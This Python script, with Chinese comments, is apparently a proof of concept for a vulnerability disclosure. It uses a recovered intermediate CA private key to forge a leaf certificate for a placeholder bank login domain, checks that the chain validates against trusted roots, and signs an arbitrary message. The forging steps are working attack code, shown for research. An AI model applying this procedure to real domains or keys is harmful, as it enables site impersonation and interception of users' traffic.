#!/usr/bin/env python3
"""
影响演示：用恢复出的中间 CA 私钥签发任意域名的叶证书，并做链验证。

只做两件会被信任库默认接受的事：
  1. 用中间 CA 私钥为占位域名签发叶证书（openssl x509 -req -CA ...）；
  2. 在仍信任 emSign ECC Root CA - G3 / emSign Root TLS CA - G3 的信任库里
     用 openssl verify 走完整链（链验证不查 OneCRL/CRLSet，所以结果仍是 OK）。
"""
import pathlib
import re
import subprocess
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
CH = ROOT / "fixtures" / "chains"
FORGE = ROOT / "forgery"
REC = ROOT / "recovered"

CERT_RE = re.compile(
    r"-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----", re.S
)


def sh(*args, **kw):
    r = subprocess.run(args, capture_output=True, text=True, **kw)
    if r.returncode != 0:
        print("FAILED:", " ".join(args))
        print(r.stderr)
        raise SystemExit(1)
    return r.stdout


def split_chain(path):
    return CERT_RE.findall(path.read_text(encoding="utf-8"))


def describe(pem_path):
    return sh("openssl", "x509", "-in", str(pem_path), "-noout", "-subject").strip()


def main():
    FORGE.mkdir(exist_ok=True)
    tmp = FORGE / "_chain"
    tmp.mkdir(exist_ok=True)

    chain = split_chain(CH / "ov-g3c-emudhra.we-have-a-problem.com.pem")
    names = ["leaf-server", "intermediate", "root"]
    for n, b in zip(names, chain):
        (tmp / f"{n}.pem").write_text(b, encoding="utf-8")
        print(f"[chain] {n:<13} {describe(tmp / f'{n}.pem')}")

    mid = tmp / "intermediate.pem"
    root = tmp / "root.pem"
    key = REC / "EM-OV-TLS-CA-G3C-emSign.key.pem"  # d = 4
    if not key.exists():  # 文件名容错
        key = sorted(REC.glob("EM-OV-TLS-CA-G3C*.key.pem"))[0]
    print(f"[key]   {key.name}  (d = 4)")

    leaf_key = FORGE / "forged-leaf.key.pem"
    leaf_csr = FORGE / "forged-leaf.csr.pem"
    leaf_crt = FORGE / "forged-login.example-bank.test.pem"
    ext = FORGE / "leaf.ext"
    ext.write_text(
        "basicConstraints=critical,CA:FALSE\n"
        "keyUsage=critical,digitalSignature\n"
        "extendedKeyUsage=serverAuth\n"
        "subjectAltName=DNS:login.example-bank.test,DNS:*.example-bank.test\n"
        "subjectKeyIdentifier=hash\n"
        "authorityKeyIdentifier=keyid:always\n",
        encoding="utf-8",
    )

    if not leaf_key.exists():
        sh("openssl", "genpkey", "-algorithm", "EC",
           "-pkeyopt", "ec_paramgen_curve:P-384", "-out", str(leaf_key))
    sh("openssl", "req", "-new", "-key", str(leaf_key), "-out", str(leaf_csr),
       "-subj", "/C=US/O=Example Bank/CN=login.example-bank.test")
    sh("openssl", "x509", "-req", "-in", str(leaf_csr), "-CA", str(mid),
       "-CAkey", str(key), "-CAcreateserial", "-days", "365",
       "-sha384", "-extfile", str(ext), "-out", str(leaf_crt))
    print(f"[forge] 签发完成 -> {leaf_crt.relative_to(ROOT)}")
    print(describe(leaf_crt))

    # 信任锚：自签的 emSign ECC Root CA - G3 与 Sectigo AAA Certificate Services
    import json
    roots = {r["name"]: r["pem"] for r in json.loads((ROOT / "fixtures" / "roots.json").read_text(encoding="utf-8"))}
    ecc_root = tmp / "ecc-root.pem"
    ecc_root.write_text(roots["emSign ECC Root CA - G3"], encoding="utf-8")
    aaa_root = tmp / "aaa-root.pem"
    aaa_root.write_text(roots["AAA Certificate Services"], encoding="utf-8")

    # AAA 交叉签名版的同一中间证书（公钥相同，签发者不同）
    entries = json.loads((ROOT / "fixtures" / "impacted-intermediates.json").read_text(encoding="utf-8"))
    aaa_mid = tmp / "intermediate-aaa.pem"
    aaa_mid.write_text(
        next(e["pem"] for e in entries
             if e["name"] == "EM OV TLS CA - G3C" and e["issuer_operator"] == "Sectigo"),
        encoding="utf-8",
    )

    paths = [
        ("emSign 层次 (leaf -> EM OV TLS CA - G3C -> emSign Root TLS CA - G3 -> ECC Root G3)",
         str(ecc_root), [str(mid), str(tmp / "root.pem")]),
        ("Sectigo 交叉签名层次 (leaf -> 同一中间 CA 的 AAA 版 -> AAA Certificate Services)",
         str(aaa_root), [str(aaa_mid)]),
    ]
    for label, cafile, untrusted in paths:
        print(f"\n[verify] {label}")
        args = ["openssl", "verify", "-show_chain", "-CAfile", cafile]
        for u in untrusted:
            args += ["-untrusted", u]
        r = subprocess.run(args + [str(leaf_crt)], capture_output=True, text=True)
        print((r.stdout + r.stderr).rstrip())

    # 额外：同一把私钥对任意消息签名，浏览器/代码签名场景同样受影响
    msg = FORGE / "message.txt"
    msg.write_text("We have a problem here - Wayne\n", encoding="utf-8")
    sig = FORGE / "wayne.sig"
    sh("openssl", "dgst", "-sha384", "-sign", str(key), "-out", str(sig), str(msg))
    pub = tmp / "mid.pub.pem"
    sh("openssl", "x509", "-in", str(mid), "-noout", "-pubkey", "-out", str(pub))
    out = sh("openssl", "dgst", "-sha384", "-verify", str(pub), "-signature", str(sig), str(msg))
    print(f"\n[sign]  {out.strip()}  ({sig.relative_to(ROOT)})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
